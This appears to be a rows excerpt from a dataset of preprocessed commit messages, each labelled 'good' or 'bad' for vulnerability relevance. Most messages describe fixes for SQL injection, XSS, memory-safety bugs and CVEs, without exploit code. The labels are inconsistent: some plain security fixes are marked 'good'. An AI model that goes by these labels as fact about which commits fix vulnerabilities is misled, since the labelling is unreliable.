"";"index";"all_text";"vuln"
"317";"2544";"web ui auth decouple auth_user from session session are processed in web ui part only pcsd backend doe not work with session so it only get who is logged in and not the whole session";"bad"
"318";"3061";"datajpa 965 fix potential blind sql injection in sort when used in combination with query we now decline sort expression that contain function such a order by length name when used with repository having a string query defined via the query annotation think of a query method a follows query select p from person p where lower p lastname lower lastname list person findbylastname param lastname string lastname sort sort call to findbylastname lannister new sort length firstname from now on throw an exception indicating function call are not allowed within the _order by_ clause however you still can use jpasort unsafe length firstname to restore the behavior kudos to niklas sa ro kaari joona immonen arto santala antti virtanen michael holopainen and antti ahola who brought this to our attention";"bad"
"319";"3919";"cve 2017 13009 ipv6 mobility add a bound check this fix a buffer over read discovered by brian geeknik carpenter add a test using the capture file supplied by the reporter s while we re at it add a comment giving the rfc for ipv6 mobility header clean up some bound check to make it clearer what they re checking by matching the subsequent extract_ call or memcpy for the binding update if none of the flag bit are set don t check the individual flag bit";"bad"
"320";"2457";"index error out on unreasonable prefix compressed path length when computing the complete path length from the encoded prefix compressed path we end up just allocating the complete path without ever checking what the encoded path length actually is this can easily lead to a denial of service by just encoding an unreasonable long path name inside of the index git already enforces a maximum path length of 4096 byte a we also have that enforcement ready in some place just make sure that the resulting path is smaller than git_path_max reported by krishna ram prakash r krp gtux in reported by vivek parikh viv0411 parikh gmail com";"bad"
"321";"1687";"net guard tcp_set_keepalive to tcp socket it possible to use raw socket to get a crash in tcp_set_keepalive sk_reset_timer fix is to make sure socket is a sock_stream one reported by dave jones davej redhat com signed off by eric dumazet edumazet google com signed off by david s miller davem davemloft net";"bad"
"322";"9571";"whitespace";"good"
"323";"661";"ath9k release allocated buffer if timed out in ath9k_wmi_cmd the allocated network buffer need to be released if timeout happens otherwise memory will be leaked signed off by navid emamdoost navid emamdoost gmail com signed off by kalle valo kvalo codeaurora org";"bad"
"324";"8548";"security cve 2018 14773 httpfoundation remove support for legacy and risky http header nicolas grekas this pr wa merged into the 2 8 branch discussion httpfoundation remove support for legacy and risky http header q a branch 2 8 bug fix yes new feature no bc break no deprecation no test pas yes fixed ticket license mit doc pr commits e447e8b921 httpfoundation remove support for legacy and risky http header";"good"
"325";"12724";"change login page footer positioning change paid support link to http www netgate com support";"good"
"326";"5951";"fix a script remote x vulnerability";"bad"
"327";"3441";"don t expose session key in view";"bad"
"328";"3323";"filter out 0a from path";"bad"
"329";"12626";"add csrf protection to print_button function a an additional note for this patch we should ideally be sending parameter to this function via p_args_to_post where those parameter are being used to change the state of mantis at the moment a form security token is created for every call of print_button whereas we really only need to do it when empty p_args_to_post this requires a bit of extra work outside the scope of this patch and almost all us of print_button are to modify mantis in some way hence this partial fix";"good"
"330";"3037";"escape html in raw source of event and task fix 3718";"bad"
"331";"6745";"update index_inc php";"good"
"332";"2043";"x 취약점 수정";"bad"
"333";"340";"fix vd 1301 and vd 1302 vulnerability this patch wa contributed by maor vermucht and or peles from vdoo connected trust";"bad"
"334";"7793";"verify decoded kadmin c string cve 2015 8629 in xdr_nullstring check that the decoded string is terminated with a zero byte and doe not contain any internal zero byte cve 2015 8629 in all version of mit krb5 an authenticated attacker can cause kadmind to read beyond the end of allocated memory by sending a string without a terminating zero byte information leakage may be possible for an attacker with permission to modify the database cvssv2 vector av n ac h au s c p i n a n e poc rl of rc c ticket 8341 new target_version 1 14 next target_version 1 13 next tag pullup";"good"
"335";"1115";"restrict exception deserialization to core and jdk class when 3rd party exception are deserialized they might carry class not present on the deserializing node this cause hard exception and loos the exception entirely this commit restricts the class we support for deserialization for core and selected jdk class to guarantee they are present on both source and target node";"bad"
"336";"400";"don t crash if crypt fails it can fail so make sure it doesn t before comparing it result with the password this address include security issue f12 libpcap remote packet capture daemon null pointer dereference denial of service";"bad"
"337";"3656";"safer loading of yaml thanks to daveyss for the report";"bad"
"338";"7875";"build drop io j testing test on latest node j node j io j have merged there will be no more major io j release also a of today io j is officially unsupported even if it still get some update while node j 4 0 0 just released will be supported until 2018";"good"
"339";"8376";"fixed bug 23029 redirect";"good"
"340";"8314";"merge pull request 122 from shana pr112 fix appveyor build and release";"good"
"341";"1338";"patch 8 1 2136 using freed memory with autocmd from fuzzer problem using freed memory with autocmd from fuzzer dhiraj mishra dominique pelle solution avoid using wp after autocommands close 5041";"bad"
"342";"7627";"updated translation japanese by yamatt nomoto updated translation polish by elisa updated translation polish informal by elisa";"good"
"343";"6435";"fix sql injection vulnerability git svn id http svn centreon com trunk centreon 10296 6bcd3966 0018 0410 8128 fd23d134de7e";"bad"
"344";"5367";"stratum parse_reconnect treat pool sent url a untrusted thanks to mick ayzenberg mick dejavusecurity com for reminding that this existed and highlighting the offender also to luke jr for actually fixing this in bfgminer d";"bad"
"345";"11255";"write to temp file then rename";"good"
"346";"1826";"disallow implicit tag truncation with finalize_with_tag";"bad"
"347";"10525";"ensure that the aes extension header is large enough reported by os fuzz issue 2394";"good"
"348";"12349";"fix x on tablename and pred_tablename";"good"
"349";"5522";"sanitize mv argument 1 fix crash on file name containing or 2 also prevents shell execution of in file name which can be used to gain remote shell access a lsyncd s target user";"bad"
"350";"11519";"loco use init_get_bits8 signed off by paul b mahol onemda gmail com";"good"
"351";"756";"kernel user pointer validation should reject kernel only address we were happily allowing syscalls with pointer into kernel only region virtual address 0xc0000000 this patch fix that by only considering user region in the current process and also double checking the region is_user_accessible flag before approving an access thanks to fire30 for finding the bug";"bad"
"352";"6358";"avoid potential x in gantt chart";"bad"
"353";"4204";"attempting to fix security flaw issue 1";"bad"
"354";"8546";"iw_cxgb4 add infiniband_addr_trans dependency the newly added fill_res_ep_entry function fails to link if config_infiniband_addr_trans is not set driver infiniband hw cxgb4 restrack o in function fill_res_ep_entry restrack c text 0x3cc undefined reference to rdma_res_to_id restrack c text 0x3d0 undefined reference to rdma_iw_cm_id this add a kconfig dependency for the driver fix 116aeb887371 iw_cxgb4 provide detailed provider specific cm_id information signed off by arnd bergmann arnd arndb de acked by greg thelen gthelen google com signed off by jason gunthorpe jgg mellanox com";"good"
"355";"5544";"db credential leak in upgrade_unattended php retrieve credential from mantis system configuration instead of accepting them from post parameter this issue wa reported by matthias karlsson http mathiaskarlsson me a part of offensive security s bug bounty program 1 paul richards original patch wa modified to align the code with master branch to basically replacing directory_separator by to facilitate porting fix 17877 1 http www offensive security com bug bounty program signed off by damien regad dregad mantisbt org";"bad"
"356";"9322";"set version";"good"
"357";"102";"prevent destructors with side effect from being unserialized";"bad"
"358";"4458";"merge branch crypt conflict inc sp core upgrade group class php inc sp core upgrade upgrade class php";"bad"
"359";"851";"fix filling out of initresp";"bad"
"360";"2881";"ib security restrict use of the write interface the driver infiniband stack us write a a replacement for bi directional ioctl this is not safe there are way to trigger write call that result in the return structure that is normally written to user space being shunted off to user specified kernel memory instead for the immediate repair detect and deny suspicious access to the write api for long term update the user space library and the kernel api to something that doesn t present the same security vulnerability likely a structured ioctl interface the impacted uapi interface are generally only available if hardware from driver infiniband is installed in the system reported by jann horn jann thejh net signed off by linus torvalds torvalds linux foundation org signed off by jason gunthorpe jgunthorpe obsidianresearch com expanded check to all known write entry point cc stable vger kernel org signed off by doug ledford dledford redhat com";"bad"
"361";"10455";"http github com imagemagick imagemagick issue 526 http github com imagemagick imagemagick issue 527";"good"
"362";"4698";"do not allocate memory for zero length string 1844 fix 1821 jerryscript dco 1 0 signed off by zoltan herczeg zherczeg u szeged partner samsung com";"bad"
"363";"10198";"repair the unit test behavior of my fix for 22508 apparently the unit test relied on being able to make ed x509 link cert even when they hadn t set any server flag in the option so instead of making client mean never generate an ed x509 cert we ll have it mean it s okay not to generate an ed x509 cert going with a minimal fix here since this is supposed to be a stable version";"good"
"364";"9329";"merge pull request 3442 in sw shopware from sw 14604 5 1 fix amount in net mode to 5 1 commit 0cfbc3e6806583446ec1aad956510fc60648320e sw 14604 fix amount in net mode";"good"
"365";"6852";"http github com imagemagick imagemagick issue 1601";"good"
"366";"2142";"fsck detect submodule path starting with dash a with url submodule path with dash are ignored by git but may end up confusing older version detecting them via fsck let u prevent modern version of git from being a vector to spread broken gitmodules to older version compared to blocking leading dash url though this detection may be le of a good idea 1 while such path provide confusing and broken result they don t seem to actually work a option injection against anything except cd in particular the submodule code seems to canonicalize to an absolute path before running git clone so it pass your clone sub 2 it s more likely that we may one day make such name actually work correctly even after we revert this fsck check it will continue to be a hassle until hosting server are all updated on the other hand it s not entirely clear that the behavior in older version is safe and if we do want to eventually allow this we may end up doing so with a special syntax anyway e g writing sub in the gitmodules file and teaching the submodule code to canonicalize it when comparing so on balance this is probably a good protection signed off by jeff king peff peff net signed off by junio c hamano gitster pobox com";"bad"
"367";"8948";"test update supported ci platform";"good"
"368";"10985";"correct documentation of option email_receive_own fix 22355";"good"
"369";"12332";"x in tracking page more";"good"
"370";"1196";"do not unescape already escaped html entity the full sanitizer wa using loofah s text method that automatically escape html entity that behavior caused some problem where string that were not escaped in the older sanitizer started to be escaped to fix these problem we used the text s encode_special_chars option a false that not just skipped the html entity escaping but unescaped already escaped entity this introduced a security bug because an attacker can pas escaped html tag that will not be sanitized and will be returned a unescaped html tag to fix it properly we introduced a new scrubber that will remove all tag and keep just the text node of these tag without changing how to escape the string cve 2015 7579";"bad"
"371";"10842";"crypto evp harden rc4_md5 cipher originally a crash in 32 bit build wa reported chacha20 poly1305 cipher the crash is triggered by truncated packet and is result of excessive hashing to the edge of accessible memory or bogus mac value is produced if x86 md5 assembly module is involved since hash operation is read only it is not considered to be exploitable beyond a do condition thanks to robert święcki for report cve 2017 3731 reviewed by rich salz rsalz openssl org";"good"
"372";"801";"fix tar gz extract vulnerability";"bad"
"373";"8251";"raise a security error when there are duplicate file in a package this is a rudimentary fix for an issue where rubygems would allow a mi signed gem to be installed a the tarball would contain multiple gem signature nothing should give u a tarball with multiple entry so we ll just disallow that";"good"
"374";"10463";"chg pymisp updated";"good"
"375";"4993";"ipv6 fix headroom calculation in udp6_ufo_fragment commit 1e2bd517c108816220f262d7954b697af03b5f9c udp6 fix udp fragmentation for tunnel traffic changed the calculation if there is enough space to include a fragment header in the skb from a skb mac_header dervived one to skb_headroom because we already peeled off the skb to transport_header this is wrong change this back to check if we have enough room before the mac_header this fix a panic saran neti reported he used the tbf scheduler which skb_gso_segments the skb the offset get negative and we panic in memcpy because the skb wa erroneously not expanded at the head reported by saran neti saran neti telus com cc pravin b shelar pshelar nicira com signed off by hannes frederic sowa hannes stressinduktion org signed off by david s miller davem davemloft net";"bad"
"376";"10813";"add pierre ossman to core team";"good"
"377";"12488";"fixed 7918 sql injection dev array is allowed when not one of the reserved word";"good"
"378";"10138";"merge git git kernel org pub scm linux kernel git rusty linux 2 6 for linus git git kernel org pub scm linux kernel git rusty linux 2 6 for linus virtio_net delay tx callback virtio add api for delayed callback virtio_test support event index vhost support event index virtio_ring support event idx feature virtio ring inline function to check for event virtio event index interface virtio add full three clause bsd text to header virtio balloon kill tell host first logic virtio console don t manually set or finalize virtio_console_f_multiport driver block virtio_blk replace cryptic number with the macro virtio_blk allow re reading config space at runtime lguest remove support for virtio_f_notify_on_empty lguest fix up compilation after move lguest fix timer interrupt setup";"good"
"379";"13061";"set explicitly to inline disposition outlook and other window communication apps require text calendar part to be displayed inline in order for the calendar integration to work our mime library force part with no or empty disposition value to be set to attachment when any other disposition parameter such a size are included making it impossible to pas through the empty disposition";"good"
"380";"5749";"prevent cross site scripting by limiting the value of show on the registration page";"bad"
"381";"2619";"smart_pkt verify packet length exceeds pkt_len_size each packet line in the git protocol is prefixed by a four byte length of how much data will follow which we parse in git_pkt_parse_line the transmitted length can either be equal to zero in case of a flush packet or ha to be at least of length four a it also includes the encoded length itself not checking this may result in a buffer overflow a we directly pas the length to function which accept a size_t length a parameter fix the issue by verifying that non flush packet have at least a length of pkt_len_size";"bad"
"382";"10932";"net use a work queue to defer net_disable_timestamp work dmitry reported a warning 1 showing that we were calling net_disable_timestamp static_key_slow_dec from a non process context grabbing a mutex while holding a spinlock or rcu_read_lock is not allowed a cong suggested we now use a work queue it is possible netstamp_clear exit while netstamp_needed_deferred is not zero but it is probably not worth trying to do better than that netstamp_needed_deferred atomic track the exact number of deferred decrement 1 info suspicious rcu usage 4 10 0 rc5 192 not tainted include linux rcupdate h 561 illegal context switch in rcu read side critical section other info that might help u debug this rcu_scheduler_active 2 debug_locks 0 2 lock held by syz executor14 23111 0 sk_lock af_inet6 at ffffffff83a35c35 lock_sock include net sock h 1454 inline 0 sk_lock af_inet6 at ffffffff83a35c35 rawv6_sendmsg 0x1e65 0x3ec0 net ipv6 raw c 919 1 rcu_read_lock at ffffffff83ae2678 nf_hook include linux netfilter h 201 inline 1 rcu_read_lock at ffffffff83ae2678 __ip6_local_out 0x258 0x840 net ipv6 output_core c 160 stack backtrace cpu 2 pid 23111 comm syz executor14 not tainted 4 10 0 rc5 192 hardware name qemu standard pc i440fx piix 1996 bios bochs 01 01 2011 call trace __dump_stack lib dump_stack c 15 inline dump_stack 0x2ee 0x3ef lib dump_stack c 51 lockdep_rcu_suspicious 0x139 0x180 kernel locking lockdep c 4452 rcu_preempt_sleep_check include linux rcupdate h 560 inline ___might_sleep 0x560 0x650 kernel sched core c 7748 __might_sleep 0x95 0x1a0 kernel sched core c 7739 mutex_lock_nested 0x24f 0x1730 kernel locking mutex c 752 atomic_dec_and_mutex_lock 0x119 0x160 kernel locking mutex c 1060 __static_key_slow_dec 0x7a 0x1e0 kernel jump_label c 149 static_key_slow_dec 0x51 0x90 kernel jump_label c 174 net_disable_timestamp 0x3b 0x50 net core dev c 1728 sock_disable_timestamp 0x98 0xc0 net core sock c 403 __sk_destruct 0x27d 0x6b0 net core sock c 1441 sk_destruct 0x47 0x80 net core sock c 1460 __sk_free 0x57 0x230 net core sock c 1468 sock_wfree 0xae 0x120 net core sock c 1645 skb_release_head_state 0xfc 0x200 net core skbuff c 655 skb_release_all 0x15 0x60 net core skbuff c 668 __kfree_skb 0x15 0x20 net core skbuff c 684 kfree_skb 0x16e 0x4c0 net core skbuff c 705 inet_frag_destroy 0x121 0x290 net ipv4 inet_fragment c 304 inet_frag_put include net inet_frag h 133 inline nf_ct_frag6_gather 0x1106 0x3840 net ipv6 netfilter nf_conntrack_reasm c 617 ipv6_defrag 0x1be 0x2b0 net ipv6 netfilter nf_defrag_ipv6_hooks c 68 nf_hook_entry_hookfn include linux netfilter h 102 inline nf_hook_slow 0xc3 0x290 net netfilter core c 310 nf_hook include linux netfilter h 212 inline __ip6_local_out 0x489 0x840 net ipv6 output_core c 160 ip6_local_out 0x2d 0x170 net ipv6 output_core c 170 ip6_send_skb 0xa1 0x340 net ipv6 ip6_output c 1722 ip6_push_pending_frames 0xb3 0xe0 net ipv6 ip6_output c 1742 rawv6_push_pending_frames net ipv6 raw c 613 inline rawv6_sendmsg 0x2d1a 0x3ec0 net ipv6 raw c 927 inet_sendmsg 0x164 0x5b0 net ipv4 af_inet c 744 sock_sendmsg_nosec net socket c 635 inline sock_sendmsg 0xca 0x110 net socket c 645 sock_write_iter 0x326 0x600 net socket c 848 do_iter_readv_writev 0x2e3 0x5b0 f read_write c 695 do_readv_writev 0x42c 0x9b0 f read_write c 872 vfs_writev 0x87 0xc0 f read_write c 911 do_writev 0x110 0x2c0 f read_write c 944 sysc_writev f read_write c 1017 inline sys_writev 0x27 0x30 f read_write c 1014 entry_syscall_64_fastpath 0x1f 0xc2 rip 0033 0x445559 rsp 002b 00007f6f46fceb58 eflags 00000292 orig_rax 0000000000000014 rax ffffffffffffffda rbx 0000000000000005 rcx 0000000000445559 rdx 0000000000000001 rsi 0000000020f1eff0 rdi 0000000000000005 rbp 00000000006e19c0 r08 0000000000000000 r09 0000000000000000 r10 0000000000000000 r11 0000000000000292 r12 0000000000700000 r13 0000000020f59000 r14 0000000000000015 r15 0000000000020400 bug sleeping function called from invalid context at kernel locking mutex c 752 in_atomic 1 irqs_disabled 0 pid 23111 name syz executor14 info lockdep is turned off cpu 2 pid 23111 comm syz executor14 not tainted 4 10 0 rc5 192 hardware name qemu standard pc i440fx piix 1996 bios bochs 01 01 2011 call trace __dump_stack lib dump_stack c 15 inline dump_stack 0x2ee 0x3ef lib dump_stack c 51 ___might_sleep 0x47e 0x650 kernel sched core c 7780 __might_sleep 0x95 0x1a0 kernel sched core c 7739 mutex_lock_nested 0x24f 0x1730 kernel locking mutex c 752 atomic_dec_and_mutex_lock 0x119 0x160 kernel locking mutex c 1060 __static_key_slow_dec 0x7a 0x1e0 kernel jump_label c 149 static_key_slow_dec 0x51 0x90 kernel jump_label c 174 net_disable_timestamp 0x3b 0x50 net core dev c 1728 sock_disable_timestamp 0x98 0xc0 net core sock c 403 __sk_destruct 0x27d 0x6b0 net core sock c 1441 sk_destruct 0x47 0x80 net core sock c 1460 __sk_free 0x57 0x230 net core sock c 1468 sock_wfree 0xae 0x120 net core sock c 1645 skb_release_head_state 0xfc 0x200 net core skbuff c 655 skb_release_all 0x15 0x60 net core skbuff c 668 __kfree_skb 0x15 0x20 net core skbuff c 684 kfree_skb 0x16e 0x4c0 net core skbuff c 705 inet_frag_destroy 0x121 0x290 net ipv4 inet_fragment c 304 inet_frag_put include net inet_frag h 133 inline nf_ct_frag6_gather 0x1106 0x3840 net ipv6 netfilter nf_conntrack_reasm c 617 ipv6_defrag 0x1be 0x2b0 net ipv6 netfilter nf_defrag_ipv6_hooks c 68 nf_hook_entry_hookfn include linux netfilter h 102 inline nf_hook_slow 0xc3 0x290 net netfilter core c 310 nf_hook include linux netfilter h 212 inline __ip6_local_out 0x489 0x840 net ipv6 output_core c 160 ip6_local_out 0x2d 0x170 net ipv6 output_core c 170 ip6_send_skb 0xa1 0x340 net ipv6 ip6_output c 1722 ip6_push_pending_frames 0xb3 0xe0 net ipv6 ip6_output c 1742 rawv6_push_pending_frames net ipv6 raw c 613 inline rawv6_sendmsg 0x2d1a 0x3ec0 net ipv6 raw c 927 inet_sendmsg 0x164 0x5b0 net ipv4 af_inet c 744 sock_sendmsg_nosec net socket c 635 inline sock_sendmsg 0xca 0x110 net socket c 645 sock_write_iter 0x326 0x600 net socket c 848 do_iter_readv_writev 0x2e3 0x5b0 f read_write c 695 do_readv_writev 0x42c 0x9b0 f read_write c 872 vfs_writev 0x87 0xc0 f read_write c 911 do_writev 0x110 0x2c0 f read_write c 944 sysc_writev f read_write c 1017 inline sys_writev 0x27 0x30 f read_write c 1014 entry_syscall_64_fastpath 0x1f 0xc2 rip 0033 0x445559 fix b90e5794c5bd net dont call jump_label_dec from irq context suggested by cong wang xiyou wangcong gmail com reported by dmitry vyukov dvyukov google com signed off by eric dumazet edumazet google com signed off by david s miller davem davemloft net";"good"
"383";"3526";"fix security brutefoce protection rule tightened a reported by dawid czarnecki";"bad"
"384";"3672";"kvm device assignment permission check cherry picked from commit 3d27e23b17010c668db311140b17bbbb70c78fb9 only allow kvm device assignment to attach to device which are not bridge have bar resource assume others are special device the user ha permission to use assigning a bridge is a configuration error it s not supported and typically doesn t result in the behavior the user is expecting anyway device without bar resource are typically chipset component that also don t have host driver we don t want user to hold such device captive or cause system problem by fencing them off into an iommu domain we determine permission to use by testing whether the user ha access to the pci sysfs resource file by default a normal user will not have access to these file so it provides a good indication that an administration agent ha granted the user access to the device yang bai add missing include avi fix comment style signed off by alex williamson alex williamson redhat com signed off by yang bai hamo by gmail com signed off by marcelo tosatti mtosatti redhat com signed off by greg kroah hartman gregkh suse de";"bad"
"385";"7321";"fix security 8829";"good"
"386";"3877";"cve 2017 12896 isakmp do bound check in isakmp_rfc3948_print this fix a buffer over read discovered by kamil frankowicz add a test using the capture file supplied by the reporter s";"bad"
"387";"5970";"fixed issue security 15094 x in label title reported by michele cisternino http www linkedin com in michelecisternino dev encode label name";"bad"
"388";"328";"x fix";"bad"
"389";"5455";"remove eval statement";"bad"
"390";"12719";"merge pull request 531 from geekwright rel259 release prep xoops 2 5 9";"good"
"391";"2747";"fix x in zoom search signed off by madhura jayaratne madhura cj gmail com";"bad"
"392";"7863";"arm64 remove asm syscalls h this patch move the sys_rt_sigreturn_wrapper prototype to arch arm64 kernel sys c and remove the asm syscalls h header signed off by catalin marina catalin marina arm com";"good"
"393";"1172";"merge pull request 1012 from ortgit master security fix validate for open redirect everywhere not just in login";"bad"
"394";"11477";"fixed";"good"
"395";"12166";"add add ons php template";"good"
"396";"9949";"merge pull request 367 from pusher feature changelog release 5 release 5 0 0 changelog update";"good"
"397";"11985";"selected active category class name change to match some cs already being used to highlight the current category int he category bar";"good"
"398";"11181";"fixing front end log out http github com bigtreecms bigtree cm issue 283";"good"
"399";"2268";"fix 12372 and 12373 crash in x86 assembler 12380 0 0 bp bl bp bl bl r bl bp bl bl mov 0 ax bx ax bx ax ax bx ax bx lea 0 bp bl bl bp bl bp bl 60 bl lea 0 bp bl r bp bl bp bl 60 bl mov 0 ax bx ax bx ax ax bx ax bx";"bad"
"400";"8179";"add csrf check";"good"
"401";"4937";"switch update check to json to prevent object injection hack";"bad"
"402";"8840";"usb core add usb_quirk_delay_ctrl_msg to usbcore quirk there s a new quirk usb_quirk_delay_ctrl_msg add it to usbcore quirk for completeness signed off by kai heng feng kai heng feng canonical com signed off by greg kroah hartman gregkh linuxfoundation org";"good"
"403";"3565";"bluetooth sco fix information leak to userspace struct sco_conninfo ha one padding byte in the end local variable cinfo of type sco_conninfo is copied to userspace with this uninizialized one byte leading to old stack content leak signed off by vasiliy kulikov segoon openwall com signed off by gustavo f padovan padovan profusion mobi";"bad"
"404";"8217";"atm fix info leak in getsockopt so_atmpvc the atm code fails to initialize the two padding byte of struct sockaddr_atmpvc inserted for alignment add an explicit memset 0 before filling the structure to avoid the info leak signed off by mathias krause minipli googlemail com signed off by david s miller davem davemloft net";"good"
"405";"11491";"1 4 x added missing release note for older version of django backport of 3f6cc33cff from master";"good"
"406";"848";"fix cve 2019 9278 avoid the use of unsafe integer overflow checking construct unsigned integer operation cannot overflow so u1 u2 u1 can be optimized away check for the actual size which should also handle the overflow document other place google patched but do not seem relevant due to other restriction fix http github com libexif libexif issue 26";"bad"
"407";"2937";"don t treat the packet length a unsigned the scanf family of function are a annoyingly bad at handling unsigned number a strtoul is both of them are perfectly willing to accept a value beginning with a negative sign a an unsigned value when using strtoul you can compensate for this by explicitly checking for a a the first character of the string but you can t do that with sscanf so revert to having pkt_len be signed and scanning it with d but check for a negative value and fail if we see a negative value bug 12394 change id i4b19b95f2e1ffc96dac5c91bff6698c246f52007 reviewed on http code wireshark org review 15230 reviewed by guy harris guy alum mit edu";"bad"
"408";"2672";"tool tiffcp c avoid uint32 underflow in cpdecodedstrips that can cause various issue such a buffer overflow in the library reported by agostino sarubbo fix http bugzilla maptools org show_bug cgi id 2598";"bad"
"409";"5472";"stop reporting bad capability after the first few";"bad"
"410";"5097";"security 55 this patch make standard post build action refuse to let you configure a downstream project you cannot currently build the one from parameterized trigger will show an error in the configure screen but still let you save the configuration need an analogous patch to that plugin doe not yet protect against posting config xml with the trigger cherry picked from commit 757bc8a53956e6fbab267214e6e0896f03c3c262 conflict core src main java hudson model descriptor java";"bad"
"411";"8751";"fix cve 2018 19994";"good"
"412";"12196";"merge pull request 828 from intelliants sql_injection_in_front_actions 792 sql injection in front action";"good"
"413";"5894";"fix x on hostname";"bad"
"414";"10470";"iasl fix an incorrectly placed range check variable wa being used before the range check from github user dcb314";"good"
"415";"1943";"fix sql injection reported by mu shcor adlab of venustech";"bad"
"416";"3286";"fix other csrf issue cross site request forgery csrf following a number of csrf report the revive team ha conducted a security audit of the admin interface script in order to identify and fix other potential csrf vulnerability the effort led to fixing 20 such issue please see the commit for the full list of file affected a cve id ha been requested but not assigned yet cwe cwe 352 cvssv2 5 av n ac l au n c n i n a p";"bad"
"417";"930";"net llc use correct size for sysctl timeout entry the timeout entry are sizeof int rather than sizeof long which mean that when they were getting read we d also leak kernel memory to userspace along with the timeout value signed off by sasha levin sasha levin oracle com signed off by david s miller davem davemloft net";"bad"
"418";"4236";"bpf fix incorrect sign extension in check_alu_op distinguish between bpf_alu64 bpf_mov bpf_k load 32 bit immediate sign extended to 64 bit and bpf_alu bpf_mov bpf_k load 32 bit immediate zero padded to 64 bit only perform sign extension in the first case starting with v4 14 this is exploitable by unprivileged user a long a the unprivileged_bpf_disabled sysctl isn t set debian assigned cve 2017 16995 for this issue v3 add cve number ben hutchings fix 484611357c19 bpf allow access into map value array signed off by jann horn jannh google com acked by edward cree ecree solarflare com signed off by alexei starovoitov ast kernel org signed off by daniel borkmann daniel iogearbox net";"bad"
"419";"6718";"1 1 0";"good"
"420";"441";"fm10k fix a potential null pointer dereference syzkaller report this kasan gpf could be caused by null ptr deref or user memory access general protection fault 0000 1 smp kasan pti cpu 0 pid 4378 comm syz executor 0 tainted g c 5 0 0 5 hardware name qemu standard pc i440fx piix 1996 bios 1 10 2 1ubuntu1 04 01 2014 rip 0010 __lock_acquire 0x95b 0x3200 kernel locking lockdep c 3573 code 00 0f 85 28 1e 00 00 48 81 c4 08 01 00 00 5b 5d 41 5c 41 5d 41 5e 41 5f c3 4c 89 ea 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 80 3c 02 00 0f 85 cc 24 00 00 49 81 7d 00 e0 de 03 a6 41 bc 00 00 rsp 0018 ffff8881e3c07a40 eflags 00010002 rax dffffc0000000000 rbx 0000000000000000 rcx 0000000000000000 rdx 0000000000000010 rsi 0000000000000000 rdi 0000000000000080 rbp 0000000000000000 r08 0000000000000001 r09 0000000000000000 r10 ffff8881e3c07d98 r11 ffff8881c7f21f80 r12 0000000000000001 r13 0000000000000080 r14 0000000000000000 r15 0000000000000001 f 00007fce2252e700 0000 g ffff8881f2400000 0000 knlgs 0000000000000000 c 0010 d 0000 e 0000 cr0 0000000080050033 cr2 00007fffc7eb0228 cr3 00000001e5bea002 cr4 00000000007606f0 dr0 0000000000000000 dr1 0000000000000000 dr2 0000000000000000 dr3 0000000000000000 dr6 00000000fffe0ff0 dr7 0000000000000400 pkru 55555554 call trace lock_acquire 0xff 0x2c0 kernel locking lockdep c 4211 __mutex_lock_common kernel locking mutex c 925 inline __mutex_lock 0xdf 0x1050 kernel locking mutex c 1072 drain_workqueue 0x24 0x3f0 kernel workqueue c 2934 destroy_workqueue 0x23 0x630 kernel workqueue c 4319 __do_sys_delete_module kernel module c 1018 inline __se_sys_delete_module kernel module c 961 inline __x64_sys_delete_module 0x30c 0x480 kernel module c 961 do_syscall_64 0x9f 0x450 arch x86 entry common c 290 entry_syscall_64_after_hwframe 0x49 0xbe rip 0033 0x462e99 code f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 48 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48 rsp 002b 00007fce2252dc58 eflags 00000246 orig_rax 00000000000000b0 rax ffffffffffffffda rbx 000000000073bf00 rcx 0000000000462e99 rdx 0000000000000000 rsi 0000000000000000 rdi 0000000020000140 rbp 0000000000000002 r08 0000000000000000 r09 0000000000000000 r10 0000000000000000 r11 0000000000000246 r12 00007fce2252e6bc r13 00000000004bcca9 r14 00000000006f6b48 r15 00000000ffffffff if alloc_workqueue fails it should return enomem otherwise may trigger this null pointer dereference while unloading driver reported by hulk robot hulkci huawei com fix 0a38c17a21a0 fm10k remove create_workqueue signed off by yue haibing yuehaibing huawei com tested by andrew bower andrewx bower intel com signed off by jeff kirsher jeffrey t kirsher intel com";"bad"
"421";"10496";"merge pull request 984 from stweil const use more const qualifier";"good"
"422";"9526";"merge pull request 22 from jan e v2 5 x fix php5 config w32";"good"
"423";"10960";"pdb add union support";"good"
"424";"277";"http github com imagemagick imagemagick issue 1609";"bad"
